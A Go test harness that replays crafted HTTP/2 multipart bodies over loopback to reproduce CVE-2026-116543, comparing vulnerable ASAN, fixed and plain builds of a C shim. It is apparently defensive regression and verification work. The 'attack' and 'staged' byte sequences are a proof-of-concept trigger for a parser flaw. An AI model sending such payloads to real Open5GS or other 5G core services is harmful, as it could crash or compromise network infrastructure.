package main

// Loopback-only HTTP/2 wire replay for CVE-2026-116543.
//
// The Go stdlib TLS server negotiates h2 via ALPN on 127.0.0.1, reads the
// request body verbatim, and passes the exact bytes on stdin to the pinned
// real-caller shim built from realcaller/realcaller.c. This is a synthetic
// consumer, NOT an Open5GS NF: it observes real h2 framing reaching the sink,
// nothing about a live NF, free-list layout or rung 5.

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"os/exec"
)

type testCase struct {
	name string
	body []byte
	bin  string
	want int
}

func main() {
	if len(os.Args) != 4 {
		fmt.Println("usage: wire <asan-wire> <fixed-wire> <plain-wire>")
		os.Exit(2)
	}

	prefix := []byte("\r\na:\r\n\r\n\r")
	staged := append([]byte{}, prefix...)
	staged = append(staged, '\n')
	pattern := [3]byte{0x00, '\r', '\n'}
	for i := range 3 * 128 {
		staged = append(staged, pattern[i%3])
	}
	attack := append([]byte{'\r', '\n'}, staged...)
	safe := append([]byte{}, prefix...)
	safe = append(safe, '\n')

	cases := []testCase{
		{"attack-asan", attack, os.Args[1], 396},
		{"staged-asan", staged, os.Args[1], 394},
		{"safe-asan", safe, os.Args[1], 10},
		{"fixed-attack-asan", attack, os.Args[2], 396},
		{"attack-plain", attack, os.Args[3], 396},
		{"staged-plain", staged, os.Args[3], 394},
	}
	byName := make(map[string]testCase, len(cases))
	for _, c := range cases {
		byName[c.name] = c
	}

	failed := 0
	handler := func(w http.ResponseWriter, r *http.Request) {
		name := r.URL.Query().Get("case")
		c, ok := byName[name]
		if !ok {
			http.Error(w, "unknown case", 400)
			return
		}
		body, err := io.ReadAll(r.Body)
		if err != nil {
			fmt.Printf("WIRE-ERROR case=%s read=%v\n", name, err)
			failed++
			return
		}
		head := body
		if len(head) > 12 {
			head = head[:12]
		}
		fmt.Printf("WIRE case=%s proto=%s len=%d head=%x\n",
			name, r.Proto, len(body), head)
		if r.ProtoMajor != 2 || len(body) != c.want {
			fmt.Printf("WIRE-ERROR case=%s proto=%s len=%d want=%d\n",
				name, r.Proto, len(body), c.want)
			failed++
		}

		cmd := exec.Command(c.bin, "wire")
		cmd.Stdin = bytes.NewReader(body)
		out, err := cmd.CombinedOutput()
		rc := 0
		if err != nil {
			if ee, ok := err.(*exec.ExitError); ok {
				rc = ee.ExitCode()
			} else {
				rc = -1
			}
		}
		fmt.Printf("CHILD case=%s rc=%d\n%s\n", name, rc, string(out))
		fmt.Fprintf(w, "case=%s proto=%s len=%d\n", name, r.Proto, len(body))
	}

	srv := httptest.NewUnstartedServer(http.HandlerFunc(handler))
	srv.EnableHTTP2 = true
	srv.StartTLS()
	defer srv.Close()
	fmt.Printf("LISTENER addr=%s\n", srv.URL)

	cli := srv.Client()
	for _, c := range cases {
		resp, err := cli.Post(srv.URL+"/sbi?case="+url.QueryEscape(c.name),
			"multipart/related; boundary=\"\"", bytes.NewReader(c.body))
		if err != nil {
			fmt.Printf("CLIENT-ERROR case=%s err=%v\n", c.name, err)
			failed++
			continue
		}
		rb, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		fmt.Printf("RESP case=%s proto=%s status=%d body=%q\n",
			c.name, resp.Proto, resp.StatusCode, string(rb))
		if resp.ProtoMajor != 2 || resp.StatusCode != 200 {
			failed++
		}
	}
	fmt.Printf("RESULT wire-failures=%d\n", failed)
	if failed > 0 {
		os.Exit(1)
	}
}
